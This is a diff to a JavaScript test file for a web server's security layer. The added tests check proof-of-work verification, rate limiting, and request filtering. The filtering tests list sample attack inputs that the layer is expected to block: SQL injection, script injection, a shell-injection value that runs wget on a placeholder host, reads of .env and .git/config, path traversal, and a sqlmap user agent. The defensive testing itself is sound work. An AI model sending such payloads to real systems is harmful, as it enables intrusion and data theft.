@@ -7,6 +7,14 @@ import http from 'node:http';
 import { createHash } from 'node:crypto';
 import { startServer } from '../server.js';
 
+function solveChallenge(data) {
+  for (let counter = 0; ; counter++) {
+    const hash = createHash('sha256').update(`${data.challenge}:${counter}`).digest();
+    const bytes = Math.floor(data.bits / 8);
+    if (hash.subarray(0, bytes).every(value => value === 0) && (data.bits % 8 === 0 || hash[bytes] < 2 ** (8 - data.bits % 8))) return counter;
+  }
+}
+
 async function runningServer(options = {}) {
   const root = await mkdtemp(path.join(tmpdir(), 'flintws-'));
   await writeFile(path.join(root, 'index.html'), '<h1>FlintWS test page</h1>');
@@ -188,13 +196,7 @@ test('FlintSecurity gates content, verifies unique work, rejects replay and bind
   assert.equal((await fetch(`${baseUrl}/__flint_security/client.js`)).status, 200);
   assert.equal((await verify({ challenge: data.challenge, counter: 0 }, 'https://outside.invalid')).status, 403);
   assert.equal((await verify({ challenge: `${data.challenge}tampered`, counter: 0 })).status, 403);
-  let counter = 0;
-  for (;;) {
-    const hash = createHash('sha256').update(`${data.challenge}:${counter}`).digest();
-    const bytes = Math.floor(data.bits / 8);
-    if (hash.subarray(0, bytes).every(value => value === 0) && (data.bits % 8 === 0 || hash[bytes] < 2 ** (8 - data.bits % 8))) break;
-    counter++;
-  }
+  const counter = solveChallenge(data);
   const passed = await verify({ challenge: data.challenge, counter });
   assert.equal(passed.status, 200);
   assert.equal((await passed.json()).verified, true);
@@ -205,6 +207,24 @@ test('FlintSecurity gates content, verifies unique work, rejects replay and bind
   const allowed = await fetch(baseUrl, { headers: { Cookie: cookie } });
   assert.equal(allowed.status, 200);
   assert.match(await allowed.text(), /FlintWS test page/);
+  // Keep the same user agent and valid cookie: these blocks must come from
+  // request inspection, rather than a changed binding or missing clearance.
+  const attacks = [
+    ['/?id=' + encodeURIComponent('1 UNION SELECT password FROM users'), 'sql-injection'],
+    ['/?id=' + encodeURIComponent(encodeURIComponent('1 UNION/**/SELECT password FROM users')), 'sql-injection'],
+    ['/?q=' + encodeURIComponent('<script>alert(1)</script>'), 'script-injection'],
+    ['/?q=' + encodeURIComponent('<img src=x onerror=alert(1)>'), 'script-injection'],
+    ['/?q=' + encodeURIComponent('; wget https://outside.invalid/payload'), 'shell-injection'],
+    ['/.env', 'sensitive-path'],
+    ['/.git/config', 'sensitive-path'],
+    ['/%252e%252e/private', 'path-traversal']
+  ];
+  for (const [target, rule] of attacks) {
+    const blocked = await fetch(baseUrl + target, { headers: { Cookie: cookie } });
+    assert.equal(blocked.status, 403, target);
+    assert.equal(blocked.headers.get('x-flint-security-rule'), rule, target);
+  }
+  assert.equal((await fetch(baseUrl, { headers: { Cookie: cookie } })).status, 200);
   assert.equal((await fetch(baseUrl, { headers: { Cookie: cookie, 'User-Agent': 'different-client' } })).status, 403);
   assert.equal((await fetch(baseUrl, { headers: { Cookie: `${cookie}tampered` } })).status, 403);
 });
@@ -218,4 +238,27 @@ test('FlintSecurity blocks upstream requests before they reach the application',
   t.after(() => server.close());
   assert.equal((await fetch(`${baseUrl}/private`, { method: 'POST', body: 'bypass attempt' })).status, 403);
   assert.equal(reached, 0);
+  const scanner = await fetch(`${baseUrl}/private`, { headers: { 'User-Agent': 'sqlmap/1.8 automated vulnerability scanner', Accept: 'text/html' } });
+  assert.equal(scanner.status, 403);
+  assert.equal(scanner.headers.get('x-flint-security-rule'), 'scanner-agent');
+  assert.doesNotMatch(await scanner.text(), /name="flint-security"/);
+  assert.equal(reached, 0);
+});
+
+test('FlintSecurity rate limits clients even after successful verification', async (t) => {
+  const { server, baseUrl } = await runningServer({ config: { security: { difficulty: 12, requestsPerMinute: 3 } } });
+  t.after(() => server.close());
+  const page = await fetch(baseUrl, { headers: { Accept: 'text/html' } });
+  const encoded = /name="flint-security" content="([^"]+)"/.exec(await page.text())[1];
+  const data = JSON.parse(Buffer.from(encoded, 'base64url'));
+  const verified = await fetch(`${baseUrl}/__flint_security/verify`, {
+    method: 'POST', headers: { Origin: baseUrl, 'Content-Type': 'application/json' },
+    body: JSON.stringify({ challenge: data.challenge, counter: solveChallenge(data) })
+  });
+  assert.equal(verified.status, 200);
+  const cookie = verified.headers.get('set-cookie').split(';')[0];
+  assert.equal((await fetch(baseUrl, { headers: { Cookie: cookie } })).status, 200);
+  const flood = await fetch(baseUrl, { headers: { Cookie: cookie } });
+  assert.equal(flood.status, 429);
+  assert.ok(Number(flood.headers.get('retry-after')) > 0);
 });
